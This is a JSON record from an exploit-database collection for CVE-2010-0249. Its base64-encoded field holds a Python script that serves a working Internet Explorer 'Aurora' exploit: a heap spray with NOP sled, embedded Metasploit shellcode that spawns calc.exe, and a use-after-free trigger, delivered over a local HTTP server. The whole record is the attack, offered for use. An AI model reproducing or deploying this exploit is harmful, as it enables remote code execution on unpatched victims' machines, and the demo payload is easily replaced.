{
    "source": "exploit-database", 
    "exploit": "Iw0KIyAgIEF1dGhvciA6IEFobWVkIE9iaWVkIChhaG1lZC5vYmllZEBnbWFpbC5jb20pDQojDQojICAgVGhpcyBwcm9ncmFtIGFjdHMgYXMgYSB3ZWIgc2VydmVyIHRoYXQgZ2VuZXJhdGVzIGFuIGV4cGxvaXQgdG8gDQojICAgdGFyZ2V0IGEgdnVsbmVyYWJpbGl0eSAoQ1ZFLTIwMTAtMDI0OSkgaW4gSW50ZXJuZXQgRXhwbG9yZXIuIA0KIyAgIFRoZSBleHBsb2l0IHdhcyB0ZXN0ZWQgdXNpbmcgSW50ZXJuZXQgRXhwbG9yZXIgNiBvbiBXaW5kb3dzIFhQIFNQMi4gDQojICAgVGhlIGV4cGxvaXQncyBwYXlsb2FkIHNwYXducyB0aGUgY2FsY3VsYXRvci4gDQojDQojICAgVXNhZ2UgIDogcHl0aG9uIGllX2F1cm9yYS5weSBbcG9ydCBudW1iZXJdDQojICAgDQogDQppbXBvcnQgc3lzDQppbXBvcnQgc29ja2V0DQoNCmZyb20gQmFzZUhUVFBTZXJ2ZXIgaW1wb3J0IEhUVFBTZXJ2ZXIsIEJhc2VIVFRQUmVxdWVzdEhhbmRsZXINCiAgICAgICAgDQpjbGFzcyBSZXF1ZXN0SGFuZGxlcihCYXNlSFRUUFJlcXVlc3RIYW5kbGVyKToNCg0KICAgIGRlZiBjb252ZXJ0X3RvX3V0ZjE2KHNlbGYsIHBheWxvYWQpOg0KICAgICAgICBlbmNfcGF5bG9hZCA9ICcnDQogICAgICAgIGZvciBpIGluIHJhbmdlKDAsIGxlbihwYXlsb2FkKSwgMik6DQogICAgICAgICAgICBudW0gPSAwDQogICAgICAgICAgICBmb3IgaiBpbiByYW5nZSgwLCAyKToNCiAgICAgICAgICAgICAgICBudW0gKz0gKG9yZChwYXlsb2FkW2kgKyBqXSkgJiAweGZmKSA8PCAoaiAqIDgpDQogICAgICAgICAgICBlbmNfcGF5bG9hZCArPSAnJSV1JTA0eCcgJSBudW0NCiAgICAgICAgcmV0dXJuIGVuY19wYXlsb2FkDQogICAgICAgICAgICAgICAgDQogICAgZGVmIGdldF9wYXlsb2FkKHNlbGYpOg0KICAgICAgICAjIHdpbjMyX2V4ZWMgLSBFWElURlVOQz1wcm9jZXNzIENNRD1jYWxjLmV4ZSBTaXplPTE2NCBFbmNvZGVyPVBleEZuc3RlbnZTdWINCiAgICAgICAgIyBodHRwOi8vbWV0YXNwbG9pdC5jb20NCiAgICAgICAgcGF5bG9hZCAgPSAnXHgzMVx4YzlceDgzXHhlOVx4ZGRceGQ5XHhlZVx4ZDlceDc0XHgyNFx4ZjRceDViXHg4MVx4NzMnDQogICAgICAgIHBheWxvYWQgKz0gJ1x4MTNceDZmXHgwMlx4YjFceDBlXHg4M1x4ZWJceGZjXHhlMlx4ZjRceDkzXHhlYVx4ZjVceDBlJw0KICAgICAgICBwYXlsb2FkICs9ICdceDZmXHgwMlx4M2FceDRiXHg1M1x4ODlceGNkXHgwYlx4MTdceDAzXHg1ZVx4ODVceDIwXHgxYScNCiAgICAgICAgcGF5bG9hZCArPSAnXHgzYVx4NTFceDRmXHgwM1x4NWFceDQ3XHhlNFx4MzZceDNhXHgwZlx4ODFceDMzXHg3MVx4OTcnDQogICAgICAgIHBheWxvYWQgKz0gJ1x4YzNceDg2XHg3MVx4N2FceDY4XHhjM1x4N2JceDAzXHg2ZVx4YzBceDVhXHhmYVx4NTRceDU2Jw0KICAgICAgICBwYXlsb2FkICs9ICdceDk1XHgwYVx4MWFceGU3XHgzYVx4NTFceDRiXHgwM1x4NWFceDY4XHhlNFx4MGVceGZhXHg4NScNCiAgICAgICAgcGF5bG9hZCArPSAnXHgzMFx4MWVceGIwXHhlNVx4ZTRceDFlXHgzYVx4MGZceDg0XHg4Ylx4ZWRceDJhXHg2Ylx4YzEnDQogICAgICAgIHBheWxvYWQgKz0gJ1x4ODBceGNlXHgwYlx4ODlceGYxXHgzZVx4ZWFceGMyXHhjOVx4MDJceGU0XHg0Mlx4YmRceDg1Jw0KICAgICAgICBwYXlsb2FkICs9ICdceDFmXHgxZVx4MWNceDg1XHgwN1x4MGFceDVhXHgwN1x4ZTRceDgyXHgwMVx4MGVceDZmXHgwMicNCiAgICAgICAgcGF5bG9hZCArPSAnXHgzYVx4NjZceDUzXHg1ZFx4ODBceGY4XHgwZlx4NTRceDM4XHhmNlx4ZWNceGMyXHhjYVx4NWUnDQogICAgICAgIHBheWxvYWQgKz0gJ1x4MDdceDdjXHg2OVx4ZWNceDFjXHg2YVx4MjlceGYwXHhlNVx4MGNceGU2XHhmMVx4ODhceDYxJw0KICAgICAgICBwYXlsb2FkICs9ICdceGQwXHg2Mlx4MGNceDJjXHhkNFx4NzZceDBhXHgwMlx4YjFceDBlJw0KICAgICAgICByZXR1cm4gc2VsZi5jb252ZXJ0X3RvX3V0ZjE2KHBheWxvYWQpDQogICAgDQogICAgZGVmIGdldF9leHBsb2l0KHNlbGYpOg0KICAgICAgICBleHBsb2l0ID0gJycnDQogICAgICAgIDxodG1sPg0KICAgICAgICA8aGVhZD4NCiAgICAgICAgICAgIDxzY3JpcHQ+DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBvYmosIGV2ZW50X29iajsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZnVuY3Rpb24gc3ByYXlfaGVhcCgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIGNodW5rX3NpemUsIHBheWxvYWQsIG5vcHNsZWQ7DQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBjaHVua19zaXplID0gMHg4MDAwMDsNCiAgICAgICAgICAgICAgICBwYXlsb2FkID0gdW5lc2NhcGUoIjxQQVlMT0FEPiIpOw0KICAgICAgICAgICAgICAgIG5vcHNsZWQgPSB1bmVzY2FwZSgiPE5PUD4iKTsNCiAgICAgICAgICAgICAgICB3aGlsZSAobm9wc2xlZC5sZW5ndGggPCBjaHVua19zaXplKQ0KICAgICAgICAgICAgICAgICAgICBub3BzbGVkICs9IG5vcHNsZWQ7DQogICAgICAgICAgICAgICAgbm9wc2xlZF9sZW4gPSBjaHVua19zaXplIC0gKHBheWxvYWQubGVuZ3RoICsgMjApOyAgICAgICAgDQogICAgICAgICAgICAgICAgbm9wc2xlZCA9IG5vcHNsZWQuc3Vic3RyaW5nKDAsIG5vcHNsZWRfbGVuKTsNCiAgICAgICAgICAgICAgICBoZWFwX2NodW5rcyA9IG5ldyBBcnJheSgpOw0KICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSAwIDsgaSA8IDIwMCA7IGkrKykNCiAgICAgICAgICAgICAgICAgICAgaGVhcF9jaHVua3NbaV0gPSBub3BzbGVkICsgcGF5bG9hZDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgDQogICAgICAgICAgICBmdW5jdGlvbiBpbml0aWFsaXplKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBvYmogPSBuZXcgQXJyYXkoKTsNCiAgICAgICAgICAgICAgICBldmVudF9vYmogPSBudWxsOw0KICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgMjAwIDsgaSsrICkNCiAgICAgICAgICAgICAgICAgICAgb2JqW2ldID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiQ09NTUVOVCIpOw0KICAgICAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgICAgIGZ1bmN0aW9uIGV2MShldnQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZXZlbnRfb2JqID0gZG9jdW1lbnQuY3JlYXRlRXZlbnRPYmplY3QoZXZ0KTsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgic3AxIikuaW5uZXJIVE1MID0gIiI7DQogICAgICAgICAgICAgICAgd2luZG93LnNldEludGVydmFsKGV2MiwgMSk7DQogICAgICAgICAgICB9DQogICAgICANCiAgICAgICAgICAgIGZ1bmN0aW9uIGV2MigpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIGRhdGEsIHRtcDsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBkYXRhID0gIiI7DQogICAgICAgICAgICAgICAgdG1wID0gdW5lc2NhcGUoIiV1MGEwYSV1MGEwYSIpOw0KICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSAwIDsgaSA8IDQgOyBpKyspDQogICAgICAgICAgICAgICAgICAgIGRhdGEgKz0gdG1wOw0KICAgICAgICAgICAgICAgIGZvciAoaSA9IDAgOyBpIDwgb2JqLmxlbmd0aCA7IGkrKyApIHsNCiAgICAgICAgICAgICAgICAgICAgb2JqW2ldLmRhdGEgPSBkYXRhOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBldmVudF9vYmouc3JjRWxlbWVudDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICBmdW5jdGlvbiBjaGVjaygpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKG5hdmlnYXRvci51c2VyQWdlbnQuaW5kZXhPZigiTVNJRSIpID09IC0xKQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7ICAgDQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChjaGVjaygpKSB7DQogICAgICAgICAgICAgICAgaW5pdGlhbGl6ZSgpOw0KICAgICAgICAgICAgICAgIHNwcmF5X2hlYXAoKTsgICAgICAgICAgICAgICANCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB3aW5kb3cubG9jYXRpb24gPSAnYWJvdXQ6YmxhbmsnDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICA8L3NjcmlwdD4NCiAgICAgICAgPC9oZWFkPg0KICAgICAgICA8Ym9keT4NCiAgICAgICAgICAgIDxzcGFuIGlkPSJzcDEiPg0KICAgICAgICAgICAgPGltZyBzcmM9ImF1cm9yYS5naWYiIG9ubG9hZD0iZXYxKGV2ZW50KSI+DQogICAgICAgICAgICA8L3NwYW4+ICAgICAgICANCiAgICAgICAgPC9ib2R5Pg0KICAgICAgICA8L2h0bWw+DQogICAgICAgICcnJw0KICAgICAgICBleHBsb2l0ID0gZXhwbG9pdC5yZXBsYWNlKCc8UEFZTE9BRD4nLCBzZWxmLmdldF9wYXlsb2FkKCkpDQogICAgICAgIGV4cGxvaXQgPSBleHBsb2l0LnJlcGxhY2UoJzxOT1A+JywgJyV1MGEwYSV1MGEwYScpDQogICAgICAgIHJldHVybiBleHBsb2l0IA0KDQogICAgZGVmIGdldF9pbWFnZShzZWxmKToNCiAgICAgICAgY29udGVudCAgPSAnXHg0N1x4NDlceDQ2XHgzOFx4MzlceDYxXHgwMVx4MDBceDAxXHgwMFx4ODBceDAwXHgwMFx4ZmZceGZmXHhmZicNCiAgICAgICAgY29udGVudCArPSAnXHgwMFx4MDBceDAwXHgyY1x4MDBceDAwXHgwMFx4MDBceDAxXHgwMFx4MDFceDAwXHgwMFx4MDJceDAyXHg0NCcNCiAgICAgICAgY29udGVudCArPSAnXHgwMVx4MDBceDNiJw0KICAgICAgICByZXR1cm4gY29udGVudA0KDQogICAgZGVmIGxvZ19yZXF1ZXN0KHNlbGYsICphcmdzLCAqKmt3YXJncyk6DQogICAgICAgIHBhc3MNCiAgICAgICAgDQogICAgZGVmIGRvX0dFVChzZWxmKToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgaWYgc2VsZi5wYXRoID09ICcvJzoNCiAgICAgICAgICAgICAgICBwcmludA0KICAgICAgICAgICAgICAgIHByaW50ICdbLV0gSW5jb21pbmcgY29ubmVjdGlvbiBmcm9tICVzJyAlIHNlbGYuY2xpZW50X2FkZHJlc3NbMF0NCiAgICAgICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKSANCiAgICAgICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAndGV4dC9odG1sJykNCiAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkNCiAgICAgICAgICAgICAgICBwcmludCAnWy1dIFNlbmRpbmcgZXhwbG9pdCB0byAlcyAuLi4nICUgc2VsZi5jbGllbnRfYWRkcmVzc1swXQ0KICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoc2VsZi5nZXRfZXhwbG9pdCgpKQ0KICAgICAgICAgICAgICAgIHByaW50ICdbLV0gRXhwbG9pdCBzZW50IHRvICVzJyAlIHNlbGYuY2xpZW50X2FkZHJlc3NbMF0NCiAgICAgICAgICAgIGVsaWYgc2VsZi5wYXRoID09ICcvYXVyb3JhLmdpZic6ICAgICAgDQogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkNCiAgICAgICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnaW1hZ2UvZ2lmJykNCiAgICAgICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkNCiAgICAgICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKHNlbGYuZ2V0X2ltYWdlKCkpDQogICAgICAgIGV4Y2VwdDogDQogICAgICAgICAgICBwcmludCAnWypdIEVycm9yIDogYW4gZXJyb3IgaGFzIG9jY3VyZWQgd2hpbGUgc2VydmluZyB0aGUgSFRUUCByZXF1ZXN0Jw0KICAgICAgICAgICAgcHJpbnQgJ1stXSBFeGl0aW5nIC4uLicNCiAgICAgICAgICAgIHN5cy5leGl0KC0xKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgIA0KZGVmIG1haW4oKToNCiAgICBpZiBsZW4oc3lzLmFyZ3YpICE9IDI6DQogICAgICAgIHByaW50ICdVc2FnZTogJXMgW3BvcnQgbnVtYmVyIChiZXR3ZWVuIDEwMjQgYW5kIDY1NTM1KV0nICUgc3lzLmFyZ3ZbMF0NCiAgICAgICAgc3lzLmV4aXQoMCkNCiAgICB0cnk6DQogICAgICAgIHBvcnQgPSBpbnQoc3lzLmFyZ3ZbMV0pDQogICAgICAgIGlmIHBvcnQgPCAxMDI0IG9yIHBvcnQgPiA2NTUzNToNCiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3INCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgc2VydiA9IEhUVFBTZXJ2ZXIoKCcnLCBwb3J0KSwgUmVxdWVzdEhhbmRsZXIpDQogICAgICAgICAgICBpcCA9IHNvY2tldC5nZXRob3N0YnluYW1lKHNvY2tldC5nZXRob3N0bmFtZSgpKQ0KICAgICAgICAgICAgcHJpbnQgJ1stXSBXZWIgc2VydmVyIGlzIHJ1bm5pbmcgYXQgaHR0cDovLyVzOiVkLycgJSAoaXAsIHBvcnQpDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgc2Vydi5zZXJ2ZV9mb3JldmVyKCkNCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBwcmludCAnWy1dIEV4aXRpbmcgLi4uJyANCiAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvcjoNCiAgICAgICAgICAgIHByaW50ICdbKl0gRXJyb3IgOiBhIHNvY2tldCBlcnJvciBoYXMgb2NjdXJyZWQnDQogICAgICAgIHN5cy5leGl0KC0xKSAgICANCiAgICBleGNlcHQgVmFsdWVFcnJvcjoNCiAgICAgICAgcHJpbnQgJ1sqXSBFcnJvciA6IGFuIGludmFsaWQgcG9ydCBudW1iZXIgd2FzIGdpdmVuJw0KICAgICAgICBzeXMuZXhpdCgtMSkNCiAgICAgICAgICAgIA0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBtYWluKCk=", 
    "filename": "platforms/windows/remote/11167.py", 
    "id": "11167", 
    "cves": [
        "CVE-2010-0249"
    ]
}